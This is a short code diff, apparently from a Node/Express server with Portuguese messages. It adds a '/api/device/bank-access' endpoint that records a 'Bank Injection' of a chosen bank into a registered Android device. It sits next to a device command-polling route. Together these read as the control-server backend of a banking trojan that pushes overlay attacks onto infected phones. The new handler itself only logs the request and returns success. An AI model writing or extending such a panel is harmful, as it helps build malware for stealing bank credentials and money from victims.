@@ -448,6 +448,32 @@ async function startServer() {
     }
   });
 
+  app.post("/api/device/bank-access", async (req, res) => {
+    try {
+      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
+      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
+      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
+      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
+      const rawBankId = typeof req.body?.bankId === "string" ? req.body.bankId : "";
+      const rawBankCountry = typeof req.body?.bankCountry === "string" ? req.body.bankCountry : "";
+
+      if (!rawDeviceUid || !rawPackageName || !rawBankId) {
+        return res.status(400).json({ success: false, message: "deviceUid, packageName e bankId sao obrigatorios" });
+      }
+
+      const targetUser = await resolveDeviceOwner();
+      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
+
+      console.log(`[Bank Injection] Banco ${rawBankId} (${rawBankCountry}) injetado no dispositivo ${deviceId}`);
+
+      return res.json({ success: true, bankId: rawBankId, country: rawBankCountry });
+    } catch (error) {
+      console.error("[Bank Injection] Failed:", error);
+      const message = error instanceof Error ? error.message : "Falha ao registrar injeção bancária";
+      return res.status(500).json({ success: false, message });
+    }
+  });
+
   app.get("/api/device/command/next", async (req, res) => {
     try {
       const rawDeviceUid = typeof req.query.deviceUid === "string" ? req.query.deviceUid : "";
